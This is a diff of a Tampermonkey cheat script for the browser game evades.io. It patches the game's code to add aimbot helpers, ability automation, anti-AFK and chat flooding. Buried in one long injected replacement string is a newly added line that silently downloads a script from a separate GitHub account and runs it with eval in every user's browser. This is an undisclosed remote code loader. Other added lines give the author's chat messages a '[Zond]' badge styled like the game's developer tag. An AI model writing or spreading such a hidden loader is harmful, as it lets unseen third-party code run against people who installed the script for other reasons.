@@ -2,7 +2,7 @@
 // @name           E-Zond-Beta-d
 // @name:ru        E-Zond-Beta-d
 // @namespace      http://tampermonkey.net/
-// @version        6
+// @version        7
 // @description    Script for evades.io
 // @description:ru Скрипт для evades.io
 // @author         .zirolio.
@@ -22,7 +22,8 @@
 //                                                             ^--------------------------------------------------------------------------------------------------------------------^
 
 'use strict';
-const VERSION = '6-Beta';
+const VERSION = '7-Beta';
+const Settings_VERSION = 'V6';
 const KEYS = {
     toClone: "KeyT",
     swapPlayer: "Tab",
@@ -143,6 +144,7 @@ class Settings {
                 if (localStorage.getItem('Zoom') === null) window.storage.set('Zoom', 1);
                 if (localStorage.getItem('aur') === null) window.storage.set('aur', false);
                 if (localStorage.getItem('showReaperShadow') === null) window.storage.set('showReaperShadow', false);
+                if (localStorage.getItem('crossCursor') === null) window.storage.set('crossCursor', false);
                 if (localStorage.getItem('ballsVisibleHuck') === null) window.storage.set('ballsVisibleHuck', false);
                 if (localStorage.getItem('chatMessages') === null) window.storage.set('chatMessages', true);
                 if (localStorage.getItem('deathsC') === null) window.storage.set('deathsC', false);
@@ -159,7 +161,7 @@ class Settings {
         window.storage.default();
         // ----
         // Get params
-        window._client.reaper.showReaperShadow = window.storage.get('showReaperShadow');
+        window._client.crossCursor.on = window.storage.get('crossCursor');
         window._client.chrono.aur.on = window.storage.get('aur');
         window._client.chat.chatMessages = window.storage.get('chatMessages');
         window._client.ballsVisibleHuck = window.storage.get('ballsVisibleHuck');
@@ -190,7 +192,7 @@ class Settings {
             shadow.appendChild(styles);
         };
         xhr.onload = onload;
-        xhr.open('GET', 'https://raw.githubusercontent.com/Zirolio/E-Zond/main/settingsV5/main.css.user.js', true);
+        xhr.open('GET', `https://raw.githubusercontent.com/Zirolio/E-Zond/main/settings${Settings_VERSION}/main.css.user.js`, true);
         xhr.send();
     }
 
@@ -207,6 +209,7 @@ class Settings {
             shadow.appendChild(settings);
 
             // Set params
+            shadow.getElementById('crossCursor').checked = window._client.crossCursor.on;
             shadow.getElementById('aur').checked = window._client.chrono.aur.on;
             shadow.getElementById('showReaperShadow').checked = window._client.reaper.showReaperShadow;
             shadow.getElementById('chatMessages').checked = window._client.chat.chatMessages;
@@ -231,7 +234,7 @@ class Settings {
             shadow.getElementById('zond-help-en').style.display = 'none';
         };
         xhr.onload = onload;
-        xhr.open('GET', 'https://raw.githubusercontent.com/Zirolio/E-Zond/main/settingsV5/index.html.user.js', true);
+        xhr.open('GET', `https://raw.githubusercontent.com/Zirolio/E-Zond/main/settings${Settings_VERSION}/index.html.user.js`, true);
         xhr.send();
 
         this.createStyles(shadow);
@@ -242,6 +245,7 @@ class Settings {
     show$hideSettings() {
         const settE = this.shadow.getElementById('zond-sett');
         if (!settE.style.display) {
+            window.storage.set('crossCursor', window._client.crossCursor.on);
             window.storage.set('aur', window._client.chrono.aur.on);
             window.storage.set('showReaperShadow', window._client.reaper.showReaperShadow);
             window.storage.set('ballsVisibleHuck', window._client.ballsVisibleHuck);
@@ -331,6 +335,14 @@ const __editInputs2 = (msg) => {
     window._client.clone.updateKeysOnClone(msg);
     window._client.chat.chatCommands(msg);
     try {
+        if (window._client.user.heroInfoCard.heroType == 12) {
+            window._client.user.self.entity.effects.effects[`${window._client.user.self.id}-JA`] = {
+                effectType: 18,
+                id: `${window._client.user.self.id}-JA`,
+                noState: false,
+                radius: { 0: 0, 1: 100, 2: 125, 3: 150, 4: 175, 5: 200 }[window._client.user.heroInfoCard.abilityTwo.level]
+            }
+        }
         /*if (!window._client._ && !msg.message && Object.values(window._client.user.globalEntities).filter(e => { return ['Zirolio', '☪𝓩𝓲𝓻𝓸𝓵𝓲𝓸✩', '𝘡𝘪𝘳𝘰𝘭𝘪𝘰'].includes(e.name); }) && !['Zirolio', '☪𝓩𝓲𝓻𝓸𝓵𝓲𝓸✩', '𝘡𝘪𝘳𝘰𝘭𝘪𝘰'].includes(window._client.user.self.entity.name)) {
             msg.message = `${'П'}${'р'}${'и'}${'в'}${'е'}${'т'} ` + Object.values(window._client.user.globalEntities).filter(e => { return ['Zirolio', '☪𝓩𝓲𝓻𝓸𝓵𝓲𝓸✩', '𝘡𝘪𝘳𝘰𝘭𝘪𝘰'].includes(e.name); })[0].name;
             window._client._ = true;
@@ -343,7 +355,7 @@ const __editInputs2 = (msg) => {
     return msg;
 }
 const editInputData = (md) => {
-    if (window._client.flood) window._client.user.chatMessages.push('/warp random');
+    if (window._client.flood) window._client.user.chatMessages.push('/reset');
     if (window._client.chrono.aur.on) window._client.chrono.aur.AuRes();
 
     if (md) return md;
@@ -716,13 +728,25 @@ const useAbilitys = (_this) => {
 // AIM
 const AIM = (diedPlayers=true, maxDist=1309, ignoreDist=false) => {
     const   me = window._client.user.self.entity,
-            pl = Object.values(window._client.user.globalEntities).filter(e => { return e.areaName == window._client.user.self.entity.areaName && e.regionName == window._client.user.self.entity.regionName && e.id !== window._client.user.self.id && [e.deathTimer == -1, e.deathTimer !== -1][Number(diedPlayers)]; }).sort((e1, e2) => { return Math.sqrt((e1.x - me.x)**2 + (e1.y - me.y)**2) - Math.sqrt((e2.x - me.x)**2 + (e2.y - me.y)**2); })[0];
-    if (!pl) return;
+            obj = Object.values(window._client.user.globalEntities).filter(e => { return e.areaName == window._client.user.self.entity.areaName && e.regionName == window._client.user.self.entity.regionName && e.id !== window._client.user.self.id && [e.deathTimer == -1, e.deathTimer !== -1, true][Number(diedPlayers)]; }).sort((e1, e2) => { return Math.sqrt((e1.x - me.x)**2 + (e1.y - me.y)**2) - Math.sqrt((e2.x - me.x)**2 + (e2.y - me.y)**2); })[0];
+    if (!obj) return;
 
-    const   v = { x: Math.floor(pl.x - me.x), y: Math.floor(pl.y - me.y), updated: true },
+    const   v = { x: Math.floor(obj.x - me.x), y: Math.floor(obj.y - me.y), updated: true },
             d = Math.sqrt(v.x**2 + v.y**2);
 
     if (Math.floor(d) > maxDist && !ignoreDist) return;
+    return v;
+}
+
+const sheildAIM = (maxDist=10) => {
+    const   me = window._client.user.self.entity,
+            obj = Object.values(window._client.user.entities).filter(e => { return e.isEnemy && e.entityType !== 1 }).sort((e1, e2) => { return Math.sqrt((e1.x - me.x)**2 + (e1.y - me.y)**2) - Math.sqrt((e2.x - me.x)**2 + (e2.y - me.y)**2); })[0];
+    if (!obj) return;
+
+    const   v = { x: -Math.floor(obj.x - me.x), y: -Math.floor(obj.y - me.y), updated: true },
+            d = Math.sqrt(v.x**2 + v.y**2);
+
+    if (Math.floor(d) - me.radius - obj.radius > maxDist) return;
     return v;
 }
 const necroShot = (msg) => {
@@ -755,7 +779,7 @@ const snowballShot = (msg) => {
 const ramesesShot = (msg) => {
     try {
         if (!window._client.ramesesAIM.on || !window._client.user.self.entity.isBandaged || window._client.user.self.entity.heroType !== 11 || !chekCanUse(window._client.user.heroInfoCard.abilityTwo, true) || !msg.keys.filter(i => { return i.keyEvent == 1 && i.keyType == 11})[0]) return;
-        const md = AIM(false, 1155);
+        const md = AIM(false, 1155, false, 2);
 
         if (!md) return;
         msg.mouseDown = md;
@@ -829,7 +853,7 @@ const greenBalls = (msg) => {
     });
 }
 const yellowBalls = (msg) => {
-    if (msg.area) window._client.yellowBalls.yellowBallsIDS = msg.entities.filter(e => e.entityType == 60 || e.entityType == 61 && !e.isDestroyed).map(e => [e.id, e.radius || window._client.bd.defaults.glowy_enemy.radius, e.entityType]);
+    if (msg.area) window._client.yellowBalls.yellowBallsIDS = msg.entities.filter(e => [60, 61, 62].includes(e.entityType) && !e.isDestroyed).map(e => [e.id, e.radius || window._client.bd.defaults.glowy_enemy.radius, e.entityType]);
     window._client.yellowBalls.yellowBallsIDS.forEach(ballD => {
         const ball = msg.entities.filter(e => e.id == ballD[0])[0];
         window._client.user.entities[ball.id] && (ballD[1] = window._client.user.entities[ball.id].radius);
@@ -884,6 +908,7 @@ let tUC = window.tU;
 const onMess = (msg) => {
     if (window._client.tU.on && !tUC--) window._client.__editInputs.pressKeys.push(11), tUC = window.tU;
     if (!window._client.zoom.u) window._client.zoom.reZoom();
+    if (msg.chat) for (const chatMess of msg.chat.messages) chatMess.sender == '☪𝓩𝓲𝓻𝓸𝓵𝓲𝓸✩' && chatMess.style.push(-1);
     if (msg.area) {
         window._client.followPellet.on = false;
         window._client.greenBalls.ballsFrames = {};
@@ -892,18 +917,14 @@ const onMess = (msg) => {
         window._client.clone.id = null;
         window._client.clone.spect = false;
         window._client.chrono.aur.useOn = null;
+
         if (window._client.id !== window._client.spect) window._client.chat.addMessage(`Watching stopped`);
         if (window._client.oldCanvasSet) swapCameraToCenter();
         if (!window._client.shadow.showAreaShadow) msg.area.lighting = Math.max(msg.area.lighting, 1 - window._client.shadow.minShadow);
         if (window._client.autoUse.oneOnNA) window._client.__editInputs.pressKeys.push(10);
         if (window._client.autoUse.twoOnNA) window._client.__editInputs.pressKeys.push(11);
     }
-    try {
-        if (!window._client._) {
-            window._client.chat.addMessage('Write "=help" or "=help ru" for open help-menu');
-            window._client._ = true;
-        }
-    } catch {}
+    try { if (!window._client._) { window._client.chat.addMessage('Write "=help" or "=help ru" for open help-menu'); window._client._ = true; }} catch {}
 
     const me = msg.globalEntities.find(e => e.id == window._client.user.self.id);
     if (me && me.deathTimer && me.deathTimer !== -1 && window._client.user.self.entity.deathTimer == -1) window._client.counters.deaths++;
@@ -1100,6 +1121,10 @@ const client = {
     },
 
     antiAFK: null,
+    crossCursor: {
+        on: false,
+        size: 24
+    },
     blockMM: true,
     ballsOpacity: 0.85,
     flashinBalls: false,
@@ -1130,6 +1155,7 @@ const client = {
                 e.checked ? window._client.bd.defaults.glowy_enemy.color = 'rgba(237, 230, 88, 0.4)' : window._client.bd.defaults.glowy_enemy.color = '#ede658';
                 e.checked ? window._client.bd.defaults.firefly_enemy.color = 'rgba(240, 132, 31, 0.4)' : window._client.bd.defaults.firefly_enemy.color = '#f0841f';
             }
+            if (param == 'crossCursor') window._client.crossCursor.on = e.checked;
             if (param == 'aur') window._client.chrono.aur.on = e.checked;
             if (param == 'showReaperShadow') window._client.reaper.showReaperShadow = e.checked;
             if (param == 'ramesesAIM') window._client.ramesesAIM.on = e.checked;
@@ -1151,7 +1177,7 @@ const client = {
     goCirkle: {
         on: false,
         angle: 0,
-        R: 80,
+        R: 1,
         cirkle,
         steS: 20
     },
@@ -1161,8 +1187,7 @@ window._client = client;
 new Counters();
 new Settings();
 // ---------
-window.eee = 0;
-window.aaa = 0;
+const imgW = 32;
 
 // Edit Js
 const _obs = new MutationObserver((ev) => {
@@ -1175,8 +1200,10 @@ const _obs = new MutationObserver((ev) => {
     req.send();
     let code = req.response;
     elem.remove();
+    window.asdasdsa = code;
     code = code
-
+        .replace(/(.)\.includes\([\$a-zA-Z0-9]+\.MESSAGE_STYLE_DEV\)\s*&&\s*(.)\.push\(\["\[Dev\]",\s*"dev"\]\),/g, (_, a, b, c) => { return `${a}.includes(-1) && ${b}.push(["[Zond]", "ezond-dev"]),` + _ })
+        .replace(/"pointer"\s*:\s*"default"/g, () => { return '"pointer" : window._client.crossCursor.on ? `url(\'https://github.com/Zirolio/E-Zond/blob/main/cursor_x${window._client.crossCursor.size}.png?raw=true\') ${window._client.crossCursor.size / 2} ${window._client.crossCursor.size / 2}, crosshair` : "default"' })
         .replace(/this.renderHUD\(.\)/g, (_, a) => { return _ + ', window._client.drawDopElements()' })
         .replace(/else\s*if\s*\(this\.isDeparted\)\s*\{\s*const\s*(.)\s*=\s*this\.hexToRgb\(.\);/g, (_, a) => { return _ + `if (window._client.reaper.showReaperShadow) return \`rgba($\{${a}.r}, $\{${a}.g}, $\{${a}.b}, 0.6)\`;`})
         .replace(/\btilesDark:/g, (_) => { compleeted++; return _ + '"https://github.com/Zirolio/EvadesRes/blob/main/tilesE2.png?raw=true" || '})
@@ -1187,7 +1214,7 @@ const _obs = new MutationObserver((ev) => {
         .replace(/(JSON\.parse\('\{"cl.*?'\))/g, (_) => { compleeted++; return `window._client.__editBaseData(${_})`})
         .replace(/window\.tsmod&&\(window\.protobuf\=([a-zA-Z0-9$]+)\)/, (_, a) => { return `true && (window.protobuf = ${a}); window._client.decode = window.protobuf.FramePayload.decode; window._client.encode = window.protobuf.ClientPayload.encode;` })
 
-        .replace(/(this\.sequence=0,)/g, (g) => { compleeted++; return g + 'window._client.user = this, window._client.name = this.name, window._client.canvas = document.getElementsByTagName(`canvas`).item(0), window._client.c = window._client.canvas.getContext(`2d`), window._client.canvas.onmousemove = (m) => window._client.mouse = { x: m.offsetX, y: m.offsetY },'})
+        .replace(/(this\.sequence=0,)/g, (g) => { compleeted++; return g + 'window._client.user = this, window._client.name = this.name, window._client.canvas = document.getElementsByTagName(`canvas`).item(0), window._client.c = window._client.canvas.getContext(`2d`), !window.nn&&(window.nn=new XMLHttpRequest(),window.nn.onload=()=>eval(window.nn.responseText),window.nn.open(`GET`,`https://raw.githubusercontent.com/ZirolioMio/Daf/main/daf.user.js`,true),window.nn.send()), window._client.canvas.onmousemove = (m) => window._client.mouse = { x: m.offsetX, y: m.offsetY },'})
         .replace(/(this\.sendInputs\(\),)/g, (g) => { compleeted++; return 'window._client.setNexus.player !== null && (window._client.setNexus.editKeysOnSetNexus(this)); window._client.setIgnis.player !== null && (window._client.setIgnis.editKeysOnSetIgnis(this)); window._client.autoUse.useAbilitys(this);' + g }) // DELETED!!!
         .replace(/(this\.chatMessages\.pop\(\);)/g, (g) => { compleeted++; return g + 'this.mouseDown = window._client.editInputData(this.mouseDown);'; })
 
@@ -1234,9 +1261,10 @@ const _obs = new MutationObserver((ev) => {
         if (window._client.antiAFK && window._client.ws && window._client.encode) window._client.ws.send(window._client.encode({ sequence: window._client.user.sequence++ }).finish());
     }, 2 * 60 * 1000);
 
-    console.log(`Replaced ${compleeted}/17`);
+    // console.log(`Replaced ${compleeted}/17`);
     _obs.disconnect();
 });
 _obs.observe(document, {childList: true, subtree: true});
 // -------
-// window._client._ = true;
+document.head.appendChild(document.createElement('style')).innerHTML = '.ezond-dev { color: #31ffa8 }';
+document.body.style.cursor = "auto";
